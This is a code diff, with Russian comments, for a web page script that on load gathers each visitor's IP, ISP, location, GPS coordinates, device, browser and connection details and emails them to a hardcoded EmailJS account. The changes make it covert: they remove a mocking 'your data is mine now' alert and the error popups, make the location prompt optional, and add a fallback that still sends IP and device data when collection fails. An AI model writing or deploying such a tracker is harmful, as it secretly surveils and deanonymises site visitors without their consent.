@@ -48,9 +48,9 @@
             }
         }
 
-        // Получение геолокации пользователя с запросом разрешения
+        // Получение геолокации пользователя (необязательное)
         function getGeolocation() {
-            return new Promise((resolve, reject) => {
+            return new Promise((resolve) => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
@@ -61,14 +61,21 @@
                             });
                         },
                         (error) => {
-                            console.warn("Ошибка при получении геолокации:", error.message);
-                            alert("Для продолжения работы сайта требуется разрешение на геолокацию.");
-                            window.location.reload(); // Перезагрузка страницы для повторного запроса геолокации
+                            console.warn("Пользователь отказался от геолокации:", error.message);
+                            resolve({
+                                latitude: "Не предоставлено",
+                                longitude: "Не предоставлено",
+                                accuracy: "Не предоставлено"
+                            });
                         }
                     );
                 } else {
                     console.warn("Геолокация не поддерживается браузером.");
-                    reject("Геолокация не поддерживается.");
+                    resolve({
+                        latitude: "Не поддерживается",
+                        longitude: "Не поддерживается",
+                        accuracy: "Не поддерживается"
+                    });
                 }
             });
         }
@@ -97,12 +104,12 @@
         // Анти-спам система: проверка отправки данных с текущего IP
         function isIpAlreadySent(ip) {
             let sentIps = JSON.parse(localStorage.getItem('sentIps')) || {};
-            return sentIps[ip] && sentIps[ip].locationSent;
+            return sentIps[ip];
         }
 
         function markIpAsSent(ip) {
             let sentIps = JSON.parse(localStorage.getItem('sentIps')) || {};
-            sentIps[ip] = { locationSent: true };
+            sentIps[ip] = true;
             localStorage.setItem('sentIps', JSON.stringify(sentIps));
         }
 
@@ -120,44 +127,56 @@
             emailjs.send("Hjikwe21782", "template_73zczgq", userData)
                 .then(function(response) {
                     console.log("Данные успешно отправлены", response);
-                    alert('Твои данные теперь у меня:)))))');
                     markIpAsSent(userData.ip);
                 }, function(error) {
                     console.error("Ошибка при отправке данных", error);
-                    alert("Ошибка при отправке данных: " + error.text);
                 });
         }
 
         // Сбор всех данных пользователя и отправка на почту
         async function collectUserData(ip) {
-            const [providerInfo, geolocation] = await Promise.all([
-                getProviderInfo(ip),
-                getGeolocation()
-            ]);
+            try {
+                const [providerInfo, geolocation] = await Promise.all([
+                    getProviderInfo(ip),
+                    getGeolocation()
+                ]);
 
-            const connectionInfo = getConnectionInfo();
-            const deviceType = getDeviceType();
+                const connectionInfo = getConnectionInfo();
+                const deviceType = getDeviceType();
 
-            let userData = {
-                ip: ip,
-                provider: providerInfo.provider,
-                city: providerInfo.city,
-                region: providerInfo.region,
-                country: providerInfo.country,
-                latitude: geolocation.latitude,
-                longitude: geolocation.longitude,
-                accuracy: geolocation.accuracy,
-                deviceType: deviceType,
-                userAgent: navigator.userAgent,
-                browserLanguage: navigator.language || "Неизвестно",
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно",
-                connectionType: connectionInfo.type,
-                connectionSpeed: connectionInfo.downlink,
-                connectionRTT: connectionInfo.rtt
-            };
+                let userData = {
+                    ip: ip,
+                    provider: providerInfo.provider,
+                    city: providerInfo.city,
+                    region: providerInfo.region,
+                    country: providerInfo.country,
+                    latitude: geolocation.latitude,
+                    longitude: geolocation.longitude,
+                    accuracy: geolocation.accuracy,
+                    deviceType: deviceType,
+                    userAgent: navigator.userAgent,
+                    browserLanguage: navigator.language || "Неизвестно",
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно",
+                    connectionType: connectionInfo.type,
+                    connectionSpeed: connectionInfo.downlink,
+                    connectionRTT: connectionInfo.rtt
+                };
 
-            sendData(userData);
+                sendData(userData);
+            } catch (error) {
+                console.error("Ошибка при сборе данных:", error);
+                
+                // Отправляем хотя бы базовые данные, если что-то пошло не так
+                let userData = {
+                    ip: ip,
+                    deviceType: getDeviceType(),
+                    userAgent: navigator.userAgent,
+                    error: "Ошибка при сборе полных данных"
+                };
+                
+                sendData(userData);
+            }
         }
 
         // Инициализация сбора данных при загрузке страницы
@@ -167,7 +186,6 @@
 
                 if (isIpAlreadySent(ip)) {
                     console.warn("Этот IP уже отправлял данные. Отправка отменена.");
-                    showError("Error(136)");
                     return;
                 }
 
